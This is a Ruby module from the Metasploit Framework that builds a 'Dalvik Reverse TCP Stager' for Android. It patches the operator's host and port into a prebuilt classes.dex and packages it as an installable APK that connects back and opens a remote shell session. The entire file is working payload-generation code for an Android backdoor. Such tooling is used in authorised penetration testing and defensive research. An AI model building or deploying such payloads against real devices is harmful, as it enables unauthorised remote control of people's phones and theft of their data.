##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#	http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'
require 'zlib'
require 'digest/sha1'

module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Dalvik

	def initialize(info = {})
		super(merge_info(info,
			'Name'			=> 'Dalvik Reverse TCP Stager',
			'Description'	=> 'Connect back stager',
			'Author'		=> 'timwr',
			'License'		=> MSF_LICENSE,
			'Platform'		=> 'android',
			'Arch'			=> ARCH_DALVIK,
			'Handler'		=> Msf::Handler::ReverseTcp,
			'Stager'		=> {'Payload' => ""}
			))
	end

	def string_sub(data, placeholder, input)
		data.gsub!(placeholder, input + ' ' * (placeholder.length - input.length))
	end

	def generate_jar(opts={})
		jar = Rex::Zip::Jar.new

		classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'))

        string_sub(classes, '127.0.0.1                       ', datastore['LHOST'].to_s) if datastore['LHOST']
        string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']

        jar.add_file("classes.dex", fix_dex_header(classes))

		files = [
			[ "AndroidManifest.xml" ],
			[ "res", "drawable-mdpi", "icon.png" ],
			[ "res", "layout", "main.xml" ],
			[ "resources.arsc" ]
		]

        jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
        jar.build_manifest

		#jar.sign(@key, @cert, @ca_certs) '~/.android/debug.keystore' -sigalg MD5withRSA -digestalg SHA1?

		jar
	end

end
